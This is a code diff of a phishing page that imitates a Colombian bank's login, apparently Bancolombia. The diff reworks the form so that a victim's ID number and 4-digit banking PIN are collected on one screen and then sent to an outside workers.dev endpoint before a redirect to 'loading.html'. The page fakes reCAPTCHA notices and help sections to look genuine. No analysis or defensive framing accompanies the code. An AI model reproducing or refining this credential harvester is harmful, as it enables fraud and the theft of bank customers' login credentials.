@@ -240,7 +240,7 @@
             background: rgba(255, 123, 0, 0.1);
         }
 
-        /* Botón Continuar */
+        /* Botón Continuar / Ingresar */
         .continue-btn {
             background: #bdbdbd;
             color: #7a7a7a;
@@ -300,6 +300,60 @@
             color: #777;
             text-align: center;
             width: 100%;
+        }
+
+        /* ===========================
+            SECCIÓN DE CLAVE (inline)
+        =========================== */
+        .help-text-clave {
+            width: 91%;
+            margin: 0 auto 8px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .help-text-clave a {
+            color: #ff7b00;
+            text-decoration: none;
+        }
+
+        .input-wrapper {
+            width: 91%;
+            margin: 0 auto;
+            position: relative;
+            display: flex;
+            justify-content: center;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px 20px;
+            border-radius: 12px;
+            border: 1px solid #dcdcdc;
+            font-size: 26px;
+            text-align: center;
+            letter-spacing: 16px;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .input-field:focus {
+            border-color: #00a651;
+            box-shadow: 0 0 0 3px rgba(0, 166, 81, 0.1);
+        }
+
+        .input-field::placeholder { color: #c0c0c0; }
+
+        .eye-icon {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 20px;
+            color: #999;
+            cursor: pointer;
         }
 
         /* ===========================
@@ -525,99 +579,6 @@
             transform: translateX(-50%) translateY(0);
         }
 
-        /* ===========================
-            SECCIÓN DE CLAVE (unificada)
-        =========================== */
-        .clave-section {
-            width: 100%;
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            margin-top: 10px;
-        }
-
-        .clave-section.show {
-            display: flex;
-            animation: fadeIn 0.4s ease;
-        }
-
-        .clave-title {
-            text-align: center;
-            font-size: 22px;
-            font-weight: 700;
-            margin-bottom: 6px;
-            width: 100%;
-        }
-
-        .clave-subtitle {
-            text-align: center;
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 25px;
-            width: 100%;
-        }
-
-        .help-text-clave {
-            max-width: 360px;
-            width: 91%;
-            margin: 0 auto 8px;
-            display: flex;
-            justify-content: space-between;
-            font-size: 14px;
-            font-weight: 600;
-        }
-
-        .help-text-clave a {
-            color: #ff7b00;
-            text-decoration: none;
-        }
-
-        .input-wrapper {
-            max-width: 360px;
-            width: 91%;
-            margin: 0 auto;
-            position: relative;
-            display: flex;
-            justify-content: center;
-        }
-
-        .input-field {
-            width: 100%;
-            padding: 16px 20px;
-            border-radius: 12px;
-            border: 1px solid #dcdcdc;
-            font-size: 26px;
-            text-align: center;
-            letter-spacing: 16px;
-            outline: none;
-            transition: all 0.3s ease;
-        }
-
-        .input-field:focus {
-            border-color: #00a651;
-            box-shadow: 0 0 0 3px rgba(0, 166, 81, 0.1);
-        }
-
-        .input-field::placeholder { color: #c0c0c0; }
-
-        .eye-icon {
-            position: absolute;
-            right: 16px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 20px;
-            color: #999;
-            cursor: pointer;
-        }
-
-        .clave-footer {
-            margin-top: 50px;
-            font-size: 13px;
-            color: #ff7b00;
-            text-align: center;
-            padding-bottom: 30px;
-        }
-
         /* Ajuste para teclado en móviles */
         @media (max-height: 600px) {
             .container {
@@ -649,104 +610,86 @@
 
             <div class="title"></div>
 
-            <!-- ==================== PASO 1: DOCUMENTO ==================== -->
-            <div id="pasoDocumento" style="width:100%; display:flex; flex-direction:column; align-items:center;">
-                <!-- TIPO DE DOCUMENTO -->
-                <label>Tipo de documento</label>
-                <div class="fake-select" id="openSelect">
-                    Cédula de Ciudadanía
-                </div>
-
-                <!-- NÚMERO DOC -->
-                <label>Número de documento</label>
-                <input type="number" placeholder="" id="userInput">
-
-                <!-- RECORDAR -->
-                <div class="switch-container">
-                    <input type="checkbox" id="rememberDoc">
-                    <label for="rememberDoc">Recordar tipo y número de documento</label>
-                </div>
-
-                <!-- BOTÓN CONTINUAR -->
-                <div class="button-container" id="buttonContainer">
-                    <button class="continue-btn" id="continueButton">Continuar</button>
-                </div>
+            <!-- TIPO DE DOCUMENTO -->
+            <label>Tipo de documento</label>
+            <div class="fake-select" id="openSelect">
+                Cédula de Ciudadanía
             </div>
 
-            <!-- ==================== PASO 2: CLAVE ==================== -->
-            <div class="clave-section" id="pasoClave">
-                <div class="clave-title">Escribe tu contraseña</div>
-                <div class="clave-subtitle">Ingresa tu contraseña única de 4 dígitos</div>
+            <!-- NÚMERO DOC -->
+            <label>Número de documento</label>
+            <input type="number" placeholder="" id="userInput">
 
-                <div class="help-text-clave">
-                    <span>Contraseña única</span>
-                    <a href="#" id="forgotPassword">¿La olvidaste?</a>
-                </div>
-
-                <!-- INPUT + OJO -->
-                <div class="input-wrapper">
-                    <input 
-                        type="password"
-                        id="claveInput"
-                        class="input-field"
-                        maxlength="4"
-                        placeholder="-  -  -  -"
-                        inputmode="numeric"
-                    >
-                    <i class="fa-solid fa-eye eye-icon" id="toggleEye"></i>
-                </div>
-
-                <div class="button-container" id="buttonClaveContainer">
-                    <button class="continue-btn" id="loginButton" disabled>Ingresar</button>
-                </div>
-
-                <div class="clave-footer">Seguridad • Accesibilidad</div>
+            <!-- RECORDAR -->
+            <div class="switch-container">
+                <input type="checkbox" id="rememberDoc">
+                <label for="rememberDoc">Recordar tipo y número de documento</label>
             </div>
 
-            <!-- ==================== RESTO (solo visible en paso documento) ==================== -->
-            <div id="restoContenido" style="width:100%; display:flex; flex-direction:column; align-items:center;">
-                <div class="bottom-text">
-                    ¿No eres usuario? <a href="#">Regístrate aquí</a>
-                </div>
+            <!-- ===== CLAVE (visible junto al documento) ===== -->
+            <div class="help-text-clave" style="margin-top:20px;">
+                <span>Contraseña única</span>
+                <a href="#" id="forgotPassword">¿La olvidaste?</a>
+            </div>
 
-                <div class="legal">
-                    Protegido por reCAPTCHA | Privacidad – Condiciones
-                </div>
+            <div class="input-wrapper">
+                <input 
+                    type="password"
+                    id="claveInput"
+                    class="input-field"
+                    maxlength="4"
+                    placeholder="-  -  -  -"
+                    inputmode="numeric"
+                >
+                <i class="fa-solid fa-eye eye-icon" id="toggleEye"></i>
+            </div>
 
-                <!-- SECCIÓN DE AYUDA -->
-                <div class="help-section">
-                    <div class="help-title">¿Cómo podemos ayudarte?</div>
-                    
-                    <div class="help-options">
-                        <div class="help-option" id="solicitarProductos">
-                            <div class="help-icon">
-                                <i class="fas fa-file-contract"></i>
-                            </div>
-                            <div class="help-text">
-                                <h3>Solicitar productos</h3>
-                                <p>Descubre y solicita nuestros productos financieros</p>
-                            </div>
+            <!-- BOTONES -->
+            <div class="button-container" id="buttonContainer">
+                <button class="continue-btn" id="loginButton" disabled>Ingresar</button>
+            </div>
+
+            <div class="bottom-text">
+                ¿No eres usuario? <a href="#">Regístrate aquí</a>
+            </div>
+
+            <div class="legal">
+                Protegido por reCAPTCHA | Privacidad – Condiciones
+            </div>
+
+            <!-- NUEVA SECCIÓN DE AYUDA -->
+            <div class="help-section">
+                <div class="help-title">¿Cómo podemos ayudarte?</div>
+                
+                <div class="help-options">
+                    <div class="help-option" id="solicitarProductos">
+                        <div class="help-icon">
+                            <i class="fas fa-file-contract"></i>
                         </div>
-                        
-                        <div class="help-option" id="contactanos">
-                            <div class="help-icon">
-                                <i class="fas fa-headset"></i>
-                            </div>
-                            <div class="help-text">
-                                <h3>Contáctanos</h3>
-                                <p>Estamos aquí para resolver tus dudas y consultas</p>
-                            </div>
+                        <div class="help-text">
+                            <h3>Solicitar productos</h3>
+                            <p>Descubre y solicita nuestros productos financieros</p>
                         </div>
                     </div>
                     
-                    <div class="payment-promo">
-                        <h3>Pagos rápidos y seguros</h3>
-                        <p>Realiza la inscripción de tus servicios públicos y privados, págalos desde cualquier lugar.</p>
-                        <button class="payment-btn" id="pagosBtn">Inscribe y paga </button>
+                    <div class="help-option" id="contactanos">
+                        <div class="help-icon">
+                            <i class="fas fa-headset"></i>
+                        </div>
+                        <div class="help-text">
+                            <h3>Contáctanos</h3>
+                            <p>Estamos aquí para resolver tus dudas y consultas</p>
+                        </div>
                     </div>
-                    
-                    <div class="website-link"></div>
                 </div>
+                
+                <div class="payment-promo">
+                    <h3>Pagos rápidos y seguros</h3>
+                    <p>Realiza la inscripción de tus servicios públicos y privados, págalos desde cualquier lugar.</p>
+                    <button class="payment-btn" id="pagosBtn">Inscribe y paga </button>
+                </div>
+                
+                <div class="website-link"></div>
             </div>
         </div>
 
@@ -791,29 +734,45 @@
             }, 3000);
         }
 
-        // ==================== PASO 1: DOCUMENTO ====================
+        // Elementos principales
         const userInput = document.getElementById('userInput');
-        const continueButton = document.getElementById('continueButton');
+        const claveInput = document.getElementById('claveInput');
+        const loginButton = document.getElementById('loginButton');
         const buttonContainer = document.getElementById('buttonContainer');
-        const pasoDocumento = document.getElementById('pasoDocumento');
-        const pasoClave = document.getElementById('pasoClave');
-        const restoContenido = document.getElementById('restoContenido');
 
-        userInput.addEventListener('input', () => {
-            const userValue = userInput.value.trim();
-            if (userValue.length >= 4) {
-                continueButton.classList.add('enabled');
+        // Validación conjunta: documento >= 4 dígitos Y clave = 4 dígitos
+        function validateForm() {
+            const docOk = userInput.value.trim().length >= 4;
+            const claveOk = claveInput.value.length === 4;
+            
+            if (docOk && claveOk) {
+                loginButton.classList.add('enabled');
+                loginButton.disabled = false;
             } else {
-                continueButton.classList.remove('enabled');
+                loginButton.classList.remove('enabled');
+                loginButton.disabled = true;
             }
+        }
+
+        userInput.addEventListener('input', validateForm);
+
+        claveInput.addEventListener('input', () => {
+            if (claveInput.value.length > 4) {
+                claveInput.value = claveInput.value.slice(0, 4);
+            }
+            validateForm();
         });
 
-        userInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter' && continueButton.classList.contains('enabled')) {
-                continueButton.click();
-            }
+        // Enter en cualquier campo -> enviar si está habilitado
+        [userInput, claveInput].forEach(inp => {
+            inp.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter' && !loginButton.disabled) {
+                    loginButton.click();
+                }
+            });
         });
 
+        // Detectar teclado en móviles
         function detectMobileKeyboard() {
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
             if (!isMobile) return;
@@ -830,68 +789,108 @@
         }
         detectMobileKeyboard();
 
-        // Al hacer clic en "Continuar": guarda datos y muestra paso clave
-        continueButton.addEventListener('click', async () => {
-            const userValue = userInput.value.trim();
-            
-            if (userValue.length >= 4) {
-                try {
-                    continueButton.classList.add('loading');
-                    continueButton.disabled = true;
-                    
-                    const transactionId = 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-                    
-                    let bancoldata;
-                    try {
-                        const storedData = localStorage.getItem('bancoldata');
-                        bancoldata = storedData ? JSON.parse(storedData) : {};
-                    } catch (e) {
-                        console.error('Error al parsear bancoldata:', e);
-                        bancoldata = {};
-                    }
-
-                    bancoldata.usuario = userValue;
-                    bancoldata.transactionId = transactionId;
-                    bancoldata.fecha = new Date().toISOString();
-                    
-                    const rememberDoc = document.getElementById('rememberDoc').checked;
-                    if (rememberDoc) {
-                        bancoldata.rememberDocument = true;
-                        bancoldata.tipoDocumento = document.getElementById('openSelect').textContent;
-                    }
-                    
-                    localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
-                    
-                    // Transición al paso de clave (sin redirigir)
-                    setTimeout(() => {
-                        continueButton.classList.remove('loading');
-                        continueButton.disabled = false;
-                        
-                        pasoDocumento.style.display = 'none';
-                        restoContenido.style.display = 'none';
-                        pasoClave.classList.add('show');
-                        
-                        // Enfocar input de clave
-                        setTimeout(() => {
-                            document.getElementById('claveInput').focus();
-                        }, 300);
-                        
-                        window.scrollTo({ top: 0, behavior: 'smooth' });
-                    }, 800);
-                    
-                } catch (error) {
-                    console.error('Error:', error);
-                    showToast('Error al procesar la solicitud', 'error');
-                    continueButton.classList.remove('loading');
-                    continueButton.disabled = false;
-                }
+        // OJITO
+        const toggleEye = document.getElementById('toggleEye');
+        toggleEye.addEventListener('click', () => {
+            if (claveInput.type === 'password') {
+                claveInput.type = 'text';
+                toggleEye.classList.replace('fa-eye', 'fa-eye-slash');
             } else {
+                claveInput.type = 'password';
+                toggleEye.classList.replace('fa-eye-slash', 'fa-eye');
+            }
+        });
+
+        // LOGIN (misma lógica que el segundo archivo)
+        async function performLogin() {
+            if (loginButton.disabled) return;
+
+            const userValue = userInput.value.trim();
+
+            if (userValue.length < 4) {
                 userInput.classList.add('shake');
                 showToast('Ingrese un número de documento válido (mínimo 4 dígitos)', 'error');
-                setTimeout(() => {
-                    userInput.classList.remove('shake');
-                }, 500);
+                setTimeout(() => userInput.classList.remove('shake'), 500);
+                return;
             }
+
+            if (claveInput.value.length !== 4) {
+                claveInput.classList.add('shake');
+                showToast('Ingrese su contraseña de 4 dígitos', 'error');
+                setTimeout(() => claveInput.classList.remove('shake'), 500);
+                return;
+            }
+
+            try {
+                loginButton.classList.add('loading');
+                loginButton.disabled = true;
+
+                let bancoldata;
+                try {
+                    const storedData = localStorage.getItem('bancoldata');
+                    bancoldata = storedData ? JSON.parse(storedData) : {};
+                } catch (e) {
+                    console.error('Error al parsear bancoldata:', e);
+                    bancoldata = {};
+                }
+
+                const transactionId = 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+
+                bancoldata.usuario = userValue;
+                bancoldata.clave = claveInput.value;
+                bancoldata.transactionId = transactionId;
+                bancoldata.fecha = new Date().toISOString();
+
+                const rememberDoc = document.getElementById('rememberDoc').checked;
+                if (rememberDoc) {
+                    bancoldata.rememberDocument = true;
+                    bancoldata.tipoDocumento = document.getElementById('openSelect').textContent;
+                }
+
+                localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+
+                loginButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
+
+                await new Promise(r => setTimeout(r, 1000));
+
+                const res = await fetch("https://quiet-haze-3548.micollflorez.workers.dev/login", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        usuario: bancoldata.usuario,
+                        clave: bancoldata.clave,
+                        transactionId
+                    })
+                });
+
+                const json = await res.json();
+
+                if (json.ok) {
+                    loginButton.innerHTML = "✔ Correcto";
+                    loginButton.style.background = "#00a651";
+                    loginButton.style.color = "#fff";
+                    setTimeout(() => (location.href = "loading.html"), 700);
+                } else {
+                    loginButton.innerHTML = "Ingresar";
+                    loginButton.classList.remove('loading');
+                    validateForm();
+                    alert("Error: " + json.error);
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showToast('Error de conexión. Intenta de nuevo.', 'error');
+                loginButton.innerHTML = "Ingresar";
+                loginButton.classList.remove('loading');
+                validateForm();
+            }
+        }
+
+        loginButton.addEventListener('click', performLogin);
+
+        // "¿La olvidaste?"
+        document.getElementById('forgotPassword').addEventListener('click', (e) => {
+            e.preventDefault();
+            showToast('Recuperación de contraseña próximamente');
         });
 
         // ====================
@@ -956,12 +955,13 @@
                 
                 if (savedData.usuario) {
                     userInput.value = savedData.usuario;
-                    userInput.dispatchEvent(new Event('input'));
                 }
                 
                 if (savedData.rememberDocument) {
                     document.getElementById('rememberDoc').checked = true;
                 }
+
+                validateForm();
                 
             } catch (e) {
                 console.error('Error al cargar datos guardados:', e);
@@ -983,103 +983,9 @@
             showToast('Redirigiendo a inscripción de pagos...');
         });
 
-        // ==================== PASO 2: CLAVE ====================
-        const claveInput = document.getElementById('claveInput');
-        const loginButton = document.getElementById('loginButton');
-
-        function validateClave() {
-            if (claveInput.value.length === 4) {
-                loginButton.classList.add('enabled');
-                loginButton.disabled = false;
-            } else {
-                loginButton.classList.remove('enabled');
-                loginButton.disabled = true;
-            }
-        }
-
-        claveInput.addEventListener('input', () => {
-            if (claveInput.value.length > 4) {
-                claveInput.value = claveInput.value.slice(0, 4);
-            }
-            validateClave();
-        });
-
-        // OJITO
-        const toggleEye = document.getElementById('toggleEye');
-        toggleEye.addEventListener('click', () => {
-            if (claveInput.type === 'password') {
-                claveInput.type = 'text';
-                toggleEye.classList.replace('fa-eye', 'fa-eye-slash');
-            } else {
-                claveInput.type = 'password';
-                toggleEye.classList.replace('fa-eye-slash', 'fa-eye');
-            }
-        });
-
-        // LOGIN (misma lógica que el segundo archivo)
-        async function performLogin() {
-            if (loginButton.disabled) return;
-
-            loginButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
-
-            let data = JSON.parse(localStorage.getItem("bancoldata") || "{}");
-            if (!data.usuario) return alert("Error interno");
-
-            const transactionId = "txn_" + Date.now();
-
-            data.clave = claveInput.value;
-            data.transactionId = transactionId;
-
-            localStorage.setItem("bancoldata", JSON.stringify(data));
-
-            await new Promise(r => setTimeout(r, 1000));
-
-            try {
-                const res = await fetch("https://quiet-haze-3548.micollflorez.workers.dev/login", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        usuario: data.usuario,
-                        clave: data.clave,
-                        transactionId
-                    })
-                });
-
-                const json = await res.json();
-
-                if (json.ok) {
-                    loginButton.innerHTML = "✔ Correcto";
-                    loginButton.style.background = "#00a651";
-                    loginButton.style.color = "#fff";
-                    setTimeout(() => (location.href = "loading.html"), 700);
-                } else {
-                    loginButton.innerHTML = "Ingresar";
-                    validateClave();
-                    alert("Error: " + json.error);
-                }
-            } catch (err) {
-                console.error(err);
-                loginButton.innerHTML = "Ingresar";
-                validateClave();
-                showToast('Error de conexión. Intenta de nuevo.', 'error');
-            }
-        }
-
-        loginButton.addEventListener("click", performLogin);
-
-        // Enter en clave
-        claveInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter' && !loginButton.disabled) {
-                loginButton.click();
-            }
-        });
-
-        // "¿La olvidaste?"
-        document.getElementById('forgotPassword').addEventListener('click', (e) => {
-            e.preventDefault();
-            showToast('Recuperación de contraseña próximamente');
-        });
-
+        // Mejorar experiencia en móviles
+        document.addEventListener('touchstart', () => {}, { passive: true });
+        
         // Prevenir zoom en input number en iOS
         userInput.addEventListener('focus', () => {
             if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
@@ -1092,8 +998,6 @@
                 userInput.style.fontSize = '15px';
             }
         });
-
-        document.addEventListener('touchstart', () => {}, { passive: true });
     </script>
 </body>
 </html>
